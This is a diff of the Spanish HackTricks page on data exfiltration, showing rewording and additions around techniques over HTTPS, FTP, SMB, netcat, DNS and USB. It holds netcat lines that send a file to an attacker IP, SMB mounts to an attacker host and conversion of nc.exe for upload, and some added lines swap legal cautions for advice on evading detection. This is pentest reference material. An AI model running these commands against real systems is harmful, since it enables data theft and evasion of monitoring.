@@ -1,4 +1,4 @@
-## Exfiltración
+# Exfiltración
 
 <details>
 
@@ -6,16 +6,20 @@
 
 * ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Obtén el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
 <img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
-**Consejo de bug bounty**: **regístrate** en **Intigriti**, una plataforma premium de **bug bounty creada por hackers, para hackers**. ¡Únete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy mismo y comienza a ganar recompensas de hasta **$100,000**!
+**Consejo de recompensa por errores**: ¡**Regístrate** en **Intigriti**, una plataforma premium de **recompensas por errores creada por hackers, para hackers**! ¡Únete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy mismo y comienza a ganar recompensas de hasta **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
+
+## Dominios comúnmente permitidos para exfiltrar información
+
+Consulte [https://lots-project.com/](https://lots-project.com/) para encontrar dominios comúnmente permitidos que pueden ser abusados.
 
 ## Copiar y pegar Base64
 
@@ -76,7 +80,7 @@ El protocolo HTTPS es una versión segura del protocolo HTTP que utiliza cifrado
 
 Para exfiltrar datos a través de un servidor HTTPS, se puede utilizar una variedad de técnicas, como la creación de un canal encubierto en el tráfico HTTPS normal o la creación de un servidor HTTPS malicioso que recopila los datos exfiltrados. 
 
-Es importante tener en cuenta que la creación de un servidor HTTPS malicioso puede ser ilegal y puede tener graves consecuencias legales. Por lo tanto, se debe tener cuidado al utilizar esta técnica y asegurarse de que se cumplan todas las leyes y regulaciones aplicables.
+Es importante tener en cuenta que la exfiltración de datos a través de un servidor HTTPS puede ser detectada por soluciones de seguridad que monitorean el tráfico de red en busca de patrones sospechosos. Por lo tanto, es importante utilizar técnicas de evasión para evitar la detección.
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -128,24 +132,20 @@ python3 -m pyftpdlib -p 21
 
 El servidor FTP es una herramienta comúnmente utilizada para transferir archivos entre sistemas. En este caso, se utiliza NodeJS para crear un servidor FTP que permita la transferencia de archivos desde y hacia el servidor.
 
-Para crear un servidor FTP en NodeJS, se puede utilizar el módulo `ftp-srv`. Este módulo proporciona una API fácil de usar para crear un servidor FTP personalizado.
+Para crear un servidor FTP en NodeJS, se puede utilizar el módulo `ftp-srv`. Este módulo proporciona una API fácil de usar para crear un servidor FTP y manejar las conexiones de los clientes.
 
-Para instalar el módulo `ftp-srv`, se puede utilizar el siguiente comando:
+Para instalar `ftp-srv`, se puede utilizar el siguiente comando:
 
 ```
 npm install ftp-srv
 ```
 
-Una vez instalado el módulo, se puede crear un servidor FTP básico utilizando el siguiente código:
+Una vez instalado, se puede crear un servidor FTP básico con el siguiente código:
 
 ```javascript
 const FtpSrv = require('ftp-srv');
 
-const ftpServer = new FtpSrv({
-  url: 'ftp://127.0.0.1:21',
-  pasv_url: 'ftp://127.0.0.1:3000',
-  greeting: 'Welcome to my FTP server'
-});
+const ftpServer = new FtpSrv('ftp://127.0.0.1:3333');
 
 ftpServer.on('login', ({connection, username, password}, resolve, reject) => {
   if (username === 'user' && password === 'pass') {
@@ -161,24 +161,24 @@ ftpServer.listen()
   });
 ```
 
-Este código crea un servidor FTP que escucha en el puerto 21 y utiliza el puerto 3000 para las conexiones pasivas. También se proporciona un mensaje de bienvenida personalizado.
+Este código crea un servidor FTP en `ftp://127.0.0.1:3333` y maneja las conexiones de los clientes. Cuando un cliente se conecta, se verifica el nombre de usuario y la contraseña. Si son correctos, se le permite acceder al directorio raíz del servidor FTP. Si no son correctos, se le niega el acceso.
 
-El servidor FTP requiere autenticación para acceder a los archivos. En este ejemplo, se utiliza el nombre de usuario "user" y la contraseña "pass". Si se proporcionan credenciales incorrectas, se devuelve un error.
-
-Una vez que se ha iniciado el servidor FTP, se pueden utilizar clientes FTP para conectarse y transferir archivos.
+Una vez que se ha creado el servidor FTP, se puede utilizar un cliente FTP para conectarse a él y transferir archivos.
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
 ### Servidor FTP (pure-ftp)
 
-El protocolo FTP (File Transfer Protocol) es uno de los protocolos más antiguos y ampliamente utilizados para transferir archivos entre sistemas. El servidor FTP es un servidor que se ejecuta en un sistema y permite a los usuarios cargar y descargar archivos desde el servidor utilizando el protocolo FTP.
+El protocolo FTP es uno de los protocolos de transferencia de archivos más antiguos y ampliamente utilizados. El servidor FTP puro es un servidor FTP de código abierto que se utiliza comúnmente en sistemas operativos basados en Unix. 
 
-Pure-FTP es un servidor FTP de código abierto que es fácil de configurar y usar. Es compatible con una amplia variedad de sistemas operativos y es muy popular entre los administradores de sistemas y los usuarios finales.
+Para exfiltrar datos a través de un servidor FTP puro, primero debe configurar el servidor FTP en su máquina de ataque. Luego, debe crear una cuenta de usuario en el servidor FTP y configurar los permisos adecuados para la cuenta de usuario. 
 
-La exfiltración de datos a través de un servidor FTP es una técnica común utilizada por los atacantes para robar datos de una organización. Los atacantes pueden utilizar una variedad de técnicas para comprometer un servidor FTP, incluyendo la explotación de vulnerabilidades conocidas, la ingeniería social y el uso de contraseñas débiles.
+Una vez que se haya configurado el servidor FTP, puede utilizar una variedad de herramientas de línea de comandos para transferir archivos desde la máquina de destino al servidor FTP. Algunas de las herramientas comunes que se utilizan para transferir archivos a través de FTP incluyen `ftp`, `lftp` y `ncftp`. 
 
-Para evitar la exfiltración de datos a través de un servidor FTP, es importante asegurarse de que el servidor esté configurado de manera segura y de que se utilicen contraseñas fuertes y políticas de seguridad adecuadas. Además, es importante monitorear regularmente el servidor para detectar cualquier actividad sospechosa y tomar medidas inmediatas para remediar cualquier problema.
+También puede utilizar herramientas de terceros como `curl` y `wget` para transferir archivos a través de FTP. Estas herramientas son especialmente útiles si desea automatizar el proceso de transferencia de archivos. 
+
+Es importante tener en cuenta que el protocolo FTP no es seguro y que los datos transferidos a través de FTP no están cifrados. Por lo tanto, se recomienda utilizar FTP solo en redes seguras y no para transferir datos confidenciales.
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -251,13 +251,13 @@ DNS es un protocolo utilizado para resolver nombres de dominio en direcciones IP
 
 Los atacantes pueden utilizar el correo electrónico para exfiltrar datos de una red comprometida. Para hacer esto, el atacante puede configurar una cuenta de correo electrónico en un servidor controlado por el atacante y luego enviar los datos a través de correos electrónicos.
 
-## USB
+## Dispositivos USB
 
 Los atacantes pueden utilizar dispositivos USB para exfiltrar datos de una red comprometida. Para hacer esto, el atacante puede copiar los datos en un dispositivo USB y luego sacar el dispositivo de la red comprometida.
 
 ## Conclusiones
 
-La exfiltración de datos es una parte importante del proceso de ataque. Los atacantes utilizan una variedad de técnicas para exfiltrar datos de una red comprometida. Es importante que los administradores de sistemas estén al tanto de estas técnicas y tomen medidas para prevenirlas.
+La exfiltración de datos es una parte importante del proceso de ataque. Los atacantes utilizan una variedad de técnicas para exfiltrar datos de una red comprometida. Es importante que los profesionales de la seguridad comprendan estas técnicas para poder proteger mejor sus redes.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -285,9 +285,9 @@ NC (Netcat) es una herramienta de red que se utiliza para leer y escribir datos 
 
 Para utilizar NC para la exfiltración de datos, primero debe establecer una conexión entre la máquina de origen y la máquina de destino. Una vez que se ha establecido la conexión, puede utilizar NC para enviar los datos desde la máquina de origen a la máquina de destino.
 
-NC también se puede utilizar para crear túneles de red, lo que permite a los atacantes acceder a sistemas remotos a través de conexiones de red seguras. Esto se puede hacer utilizando la opción -L de NC para escuchar en un puerto específico y la opción -p para especificar el puerto de destino.
+NC también se puede utilizar para crear túneles de red, lo que permite a los atacantes acceder a sistemas remotos a través de conexiones de red seguras. Esto se puede hacer utilizando la opción "-L" de NC para crear un túnel de escucha en la máquina de destino y la opción "-p" para especificar el puerto en el que se escuchará.
 
-NC es una herramienta muy poderosa que se utiliza comúnmente en pruebas de penetración y en ataques de hacking. Es importante tener en cuenta que el uso de NC para fines malintencionados puede ser ilegal y puede resultar en consecuencias graves.
+NC es una herramienta muy poderosa que se utiliza comúnmente en pruebas de penetración y en ataques de hacking. Es importante tener en cuenta que el uso de NC para la exfiltración de datos puede ser detectado por los sistemas de seguridad, por lo que se deben tomar medidas para ocultar la actividad de NC.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -520,14 +520,14 @@ Ahora solo pesa 29 kb. Perfecto. Ahora vamos a desensamblarlo:
 ```
 wine exe2bat.exe nc.exe nc.txt
 ```
-Ahora simplemente copiamos y pegamos el texto en nuestra ventana de shell de Windows. Y automáticamente creará un archivo llamado nc.exe
+Ahora simplemente copiamos y pegamos el texto en nuestra shell de Windows. Y automáticamente creará un archivo llamado nc.exe
 
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
 <img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
-**Consejo de recompensa por errores**: ¡**Regístrese** en **Intigriti**, una plataforma premium de **recompensas por errores creada por hackers, para hackers**! ¡Únase a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy mismo y comience a ganar recompensas de hasta **$100,000**!
+**Consejo de recompensa por errores**: **regístrese** en **Intigriti**, una plataforma premium de **recompensa por errores creada por hackers, para hackers**! Únase a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy mismo y comience a ganar recompensas de hasta **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
@@ -537,8 +537,8 @@ Ahora simplemente copiamos y pegamos el texto en nuestra ventana de shell de Win
 
 * ¿Trabaja en una **empresa de ciberseguridad**? ¿Quiere ver su **empresa anunciada en HackTricks**? ¿O quiere tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulte los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Obtenga la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Únase al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígame** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* Obtenga el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
+* **Únase al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síganos** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Comparta sus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
